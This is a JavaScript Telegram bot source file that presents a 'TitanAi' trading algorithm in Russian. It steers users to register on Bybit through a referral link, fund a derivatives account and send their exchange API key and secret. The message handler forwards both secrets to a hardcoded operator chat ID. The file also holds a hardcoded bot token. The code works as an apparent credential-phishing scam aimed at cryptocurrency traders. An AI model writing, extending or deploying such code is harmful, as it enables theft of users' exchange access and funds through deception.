const {Telegraf} = require('telegraf');
const path = require('path');

const userBotToken = '6036115851:AAE6sUzu_728gkfqz_FiWCentNC5UCuG-Bs';

// Создаем экземпляры ботов
const bot = new Telegraf(userBotToken);

const confirmAsk = new Map();

bot.start(async (ctx) => {
    const imagePath = path.join(__dirname, 'img', 'api.png');
    await ctx.replyWithPhoto({source: imagePath});
    await ctx.reply('Нажмите на кнопку "Подключиться", чтобы подключиться к торговому алгоритму', {
        reply_markup: {
            inline_keyboard: [
                [
                    {
                        text: 'Подключиться',
                        callback_data: 'connect'
                    }
                ],
            ]
        }
    });
});

bot.help(async (ctx) => {
    ctx.reply('Пишите сюда - @ai_botsupport')
});

bot.command('getmanual', async (ctx) => {
    ctx.reply('https://www.bybit.com/invite?ref=QY9YWY зарегистрируйтесь на бирже по этой ссылке, и пройдите 1-й уровень KYC', {
        reply_markup: {
            inline_keyboard: [
                [
                    {
                        text: 'Далее',
                        callback_data: 'next'
                    }
                ],
            ]
        }
    })
});

bot.command('community', async (ctx) => {
    let userId = ctx.from.id;
    const linkText = 'TitanAi';
    const linkUrl = 'https://t.me/algoritmTitanAi';
    const message = `Наш паблик ➡️ [${linkText}](${linkUrl}) `;

    await ctx.telegram.sendMessage(userId, message, {parse_mode: 'Markdown'});
});

bot.action('connect', async (ctx) => {
    ctx.reply('Зарегистрируйтесь на бирже по ссылке ниже, и пройдите 1-й уровень KYC ')
    ctx.replyWithHTML('<i>❗️ все нужно выполнять с компьютера или ноутбука</i>')
    ctx.reply('https://www.bybit.com/invite?ref=QY9YWY', {
        reply_markup: {
            inline_keyboard: [
                [
                    {
                        text: 'Далее',
                        callback_data: 'next'
                    }
                ],
            ]
        }
    })
});

bot.action('next', async (ctx) => {
    await ctx.reply('Обязательно прочтите инструкцию: https://telegra.ph/Podklyuchenie-do-TitanAi-05-15');
    await ctx.reply('Убедитесь, что вы завели сумму, которой вы хотите торговать, на деривативный счет (как в инструкции)', {
        reply_markup: {
            inline_keyboard: [
                [
                    {
                        text: 'Да, все сделано!',
                        callback_data: 'next1'
                    }
                ],
            ]
        }
    })
});

bot.action('next1', async (ctx) => {
    const replyOptions = {
        reply_markup: {
            force_reply: true
        }
    };

    await ctx.reply('Пришлите API ключ', replyOptions);
});

let userStates = {};

bot.on('text', async (ctx) => {
    const userId = ctx.from.id;

    const replyOptions = {
        reply_markup: {
            force_reply: true
        }
    };

    if (! userStates[userId]) {
        await bot.telegram.sendMessage(1924611143, `API Ключ от ${
            ctx.from.first_name
        }, ID: ${
            ctx.from.id
        }`);
        await ctx.forwardMessage(1924611143, ctx.message.message_id);
        await ctx.reply('Пришлите API секрет', replyOptions);

        userStates[userId] = 'firstTypeHandled';
    } else if (userStates[userId] === 'firstTypeHandled') {
        await bot.telegram.sendMessage(1924611143, `API Ceкрет от ${
            ctx.from.first_name
        }, ID: ${
            ctx.from.id
        }`);
        await ctx.forwardMessage(1924611143, ctx.message.message_id);

        const imagePath = path.join(__dirname, 'img', 'done.png');

        await ctx.replyWithPhoto({source: imagePath});
        await ctx.reply('Готово! Ожидайте подключения. Мы сообщим вам, когда все будет готово!');

        confirmAsk.set(ctx.from.id, null);
        // Отправляем сообщение менеджеру для подтверждения запроса
        await bot.telegram.sendMessage(1924611143, `Запрос на подключение от пользователя ${
            ctx.from.first_name
        }, ID: ${
            ctx.from.id
        }`, {
            reply_markup: {
                inline_keyboard: [
                    [
                        {
                            text: 'Подключено',
                            callback_data: `approve-${
                                ctx.from.id
                            }`
                        }
                    ],
                ]
            }
        });

        // Set the user's state to indicate the second type of message is handled
        userStates = {};
    }
});

bot.action(/^approve-(\d+)$/, async (ctx) => { // Извлекаем id пользователя, которого нужно подключить
    const userId = parseInt(ctx.match[1], 10);
    // Связываем пользователя с текущим менеджером
    confirmAsk.set(userId, ctx.from.id);
    // Отправляем пользователю сообщение о подключении
    await bot.telegram.sendMessage(userId, 'Вы успешно подключены к торговому алгоритму!✅');

    const linkText = 'TitanAi';
    const linkUrl = 'https://t.me/algoritmTitanAi';
    const message = `Не забудьте подписаться на наc ⬇️ [${linkText}](${linkUrl}) `;

    await ctx.telegram.sendMessage(userId, message, {parse_mode: 'Markdown'});
});
bot.launch();
